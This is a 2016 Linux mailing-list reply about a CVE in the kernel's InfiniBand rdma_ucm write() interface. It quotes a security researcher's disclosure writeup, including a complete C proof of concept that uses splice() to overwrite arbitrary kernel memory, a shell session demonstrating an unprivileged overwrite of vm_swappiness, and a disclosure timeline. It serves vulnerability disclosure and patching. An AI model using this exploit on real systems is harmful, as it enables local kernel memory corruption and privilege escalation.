From: Yann Droneaud <ydroneaud-RlY5vtjFyJ3QT0dZR+AlfA@public.gmane.org>
Subject: Re: [oss-security] CVE Request: Linux: IB/security: Restrict use of
 the write() interface'
Date: Mon, 09 May 2016 21:10:41 +0200
Message-ID: <1462821041.4268.43.camel@opteya.com>
References: <20160507042232.GA5286@eldamar.local>
	 <1462645186.4268.27.camel@opteya.com> <20160509180208.GB6372@pc.thejh.net>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: QUOTED-PRINTABLE
Return-path: <linux-rdma-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
In-Reply-To: <20160509180208.GB6372-J1fxOzX/cBvk1uMJSBkQmQ@public.gmane.org>
Sender: linux-rdma-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
To: Jann Horn <jann-XZ1E9jl8jIdeoWH0uzbU5w@public.gmane.org>
Cc: Jason Gunthorpe <jgunthorpe-ePGOBjL8dl3ta4EC/59zMFaTQe2KTcn/@public.gmane.org>, Doug Ledford <dledford-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, linux-rdma-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, oss-security-ZwoEplunGu1jrUoiu81ncdBPR1lH4CV8@public.gmane.org
List-Id: linux-rdma@vger.kernel.org

[Cc:=C2=A0oss-security-ZwoEplunGu1jrUoiu81ncdBPR1lH4CV8@public.gmane.org]

Hi,

Le lundi 09 mai 2016 =C3=A0 20:02 +0200, Jann Horn a =C3=A9crit=C2=A0:
> On Sat, May 07, 2016 at 08:19:46PM +0200, Yann Droneaud wrote:
> > Le samedi 07 mai 2016 =C3=A0 06:22 +0200, Salvatore Bonaccorso a =C3=
=A9crit=C2=A0:
> > >=20
> > > =C2=A0
> > > Jann Horn reported an issue in the infiniband stack. It has been
> > > fixed in v4.6-rc6 with commit
> > > e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3:
> > >=20
> > > https://git.kernel.org/linus/e6bd18f57aad1a2d1ef40e646d03ed0f2515=
c9e3
> > >=20
> > > >=20
> > > >=20
> > > > IB/security: Restrict use of the write() interface
> > > > The drivers/infiniband stack uses write() as a replacement for
> > > > bi-directional ioctl().=C2=A0=C2=A0This is not safe. There are =
ways to
> > > > trigger write calls that result in the return structure that
> > > > is normally written to user space being shunted off to user
> > > > specified kernel memory instead.
> > > >=20
> > That's an interesting issue.
> >=20
> > I thought access_ok() done as part of copy_to_user() would protect
> > from such unwelcomed behavior. But it's not if the kernel invoke
> > write() handler outside of a user process.
> >=20
> > Anyway, as I don't see yet how to reproduce the issue, is there a
> > PoC available, I would be interested by a mean to trigger such
> > write().

> Here is my writeup of the issue that I made quite a while ago - the
> timeline is missing some of the more recent stuff, but meh.
>=20
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D
>=20
>=20
> Here is a PoC that can be used to clobber data at arbitrary
> writable kernel addresses if the rdma_ucm module is loaded (without
> actually needing Infiniband hardware to be present):
>=20
> =3D=3D=3D=3D=3D
> #define _GNU_SOURCE
> #include=20
> #include=20
> #include=20
> #include=20
> #include=20
> #include=20
>=20
> #include=20
> #include=20
> #include=20
> #include=20
> #include=20
>=20
> #define RDMA_PS_TCP 0x0106
>=20
> // This method forces the kernel to write arbitrary data to the
> // target fd under set_fs(KERNEL_DS), bypassing address limit
> // checks in anything that extracts pointers from written data.
> int write_without_addr_limit(int fd, char *buf, size_t len) {
> =C2=A0 int pipefds[2];
> =C2=A0 if (pipe(pipefds))
> =C2=A0=C2=A0=C2=A0=C2=A0return -1;
> =C2=A0 ssize_t len_ =3D write(pipefds[1], buf, len);
> =C2=A0 if (len =3D=3D -1)
> =C2=A0=C2=A0=C2=A0=C2=A0return -1;
> =C2=A0 int res =3D splice(pipefds[0], NULL, fd, NULL, len_, 0);
> =C2=A0 int errno_ =3D errno;
> =C2=A0 close(pipefds[0]);
> =C2=A0 close(pipefds[1]);
> =C2=A0 errno =3D errno_;
> =C2=A0 return res;
> }
>=20
> int clobber_kaddr(unsigned long kaddr) {
> =C2=A0 // open infiniband fd
> =C2=A0 int fd =3D open("/dev/infiniband/rdma_cm", O_RDWR);
> =C2=A0 if (fd =3D=3D -1)
> =C2=A0=C2=A0=C2=A0=C2=A0err(1, "unable to open /dev/infiniband/rdma_c=
m - maybe the RDMA kernel module isn't loaded?");
>=20
> =C2=A0 // craft malicious write buffer
> =C2=A0 // structure:
> =C2=A0 //=C2=A0=C2=A0=C2=A0struct rdma_ucm_cmd_hdr hdr
> =C2=A0 //=C2=A0=C2=A0=C2=A0struct rdma_ucm_create_id cmd
> =C2=A0 char buf[sizeof(struct rdma_ucm_cmd_hdr) + sizeof(struct rdma_=
ucm_create_id)];
> =C2=A0 struct rdma_ucm_cmd_hdr *hdr =3D (void*)buf;
> =C2=A0 struct rdma_ucm_create_id *cmd =3D (void*)(buf + sizeof(struct=
 rdma_ucm_cmd_hdr));
> =C2=A0 hdr->cmd =3D RDMA_USER_CM_CMD_CREATE_ID;
> =C2=A0 hdr->in =3D 0;
> =C2=A0 hdr->out =3D sizeof(struct rdma_ucm_create_id_resp);
> =C2=A0 cmd->ps =3D RDMA_PS_TCP;
> =C2=A0 cmd->response =3D kaddr;
>=20
> =C2=A0 int res =3D write_without_addr_limit(fd, buf, sizeof(buf));
> =C2=A0 int errno_ =3D errno;
> =C2=A0 close(fd);
> =C2=A0 errno =3D errno_;
> =C2=A0 return res;
> }
>=20
> int main(int argc, char **argv) {
> =C2=A0 if (argc !=3D 2)
> =C2=A0=C2=A0=C2=A0=C2=A0errx(1, "want one argument (kernel address to=
 clobber)");
> =C2=A0 char *endp;
> =C2=A0 unsigned long kaddr =3D strtoul(argv[1], &endp, 0);
> =C2=A0 if (kaddr =3D=3D ULONG_MAX || *endp || endp =3D=3D argv[1])
> =C2=A0=C2=A0=C2=A0=C2=A0errx(1, "bad input number");
>=20
> =C2=A0 int r =3D clobber_kaddr(kaddr);
> =C2=A0 if (r >=3D 0) {
> =C2=A0=C2=A0=C2=A0=C2=A0printf("that probably worked? clobber_kaddr(0=
x%lx)=3D%d\n", kaddr, r);
> =C2=A0=C2=A0=C2=A0=C2=A0return 0;
> =C2=A0 } else {
> =C2=A0=C2=A0=C2=A0=C2=A0printf("failed: %m\n");
> =C2=A0=C2=A0=C2=A0=C2=A0return 1;
> =C2=A0 }
> }


Is this only achievable through splice() ?


> =3D=3D=3D=3D=3D
>=20
> And here is an example that shows that this indeed works, tested
> on a Debian distro kernel:
>=20
> First, as root (warning: this will make the currently running system
> exploitable):
> root@debian:~# modprobe rdma_ucm
>=20
> Now, as attacker:
> user@debian:~$ cat /proc/sys/vm/swappiness
> 60
> user@debian:~$ ls -l /dev/infiniband/rdma_cm
> crw-rw-rw- 1 root root 10, 59 Jan=C2=A0=C2=A09 23:07 /dev/infiniband/=
rdma_cm
> user@debian:~$ gdb -q -ex 'print &vm_swappiness' -ex quit
> /usr/lib/debug/boot/vmlinux-$(uname -r)
> Reading symbols from /usr/lib/debug/boot/vmlinux-3.16.0-4-
> amd64...done.
> $1 =3D (int *) 0xffffffff81861760 <vm_swappiness>
> user@debian:~$ gcc -Wall -std=3Dgnu99 -o infiniwrite infiniwrite.c
> user@debian:~$ ./infiniwrite 0xffffffff81861760
> that probably worked? clobber_kaddr(0xffffffff81861760)=3D32
> user@debian:~$ cat /proc/sys/vm/swappiness
> 0
>=20
> As you can see, the vm_swappiness variable in kernelspace was
> overwritten by an unprivileged userspace process.
>=20
> Timeline:
> 2015-09-11 initial report to security-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org and infiniband maint=
ainers;
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0exploitability isn't =
entirely clear to me yet
> 2015-09-11 infiniband maintainer responds, but apparently doesn't see=
 an issue
> 2015-12-26 I figure out the splice trick and ask the infiniband maint=
ainers to
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0fix the issue
> 2015-12-26 Andy Lutomirski asks the infiniband maintainers to fix the=
 issue and
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0break the ABI if nece=
ssary
> 2016-01-25 I send the PoC contained in this message to security@kerne=
l.org and
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0the infiniband mainta=
iners and ask them again to fix the issue.
>=20

Thanks a lot !

Regards.

--=C2=A0
Yann Droneaud
OPTEYA


--
To unsubscribe from this list: send the line "unsubscribe linux-rdma" i=
n
the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
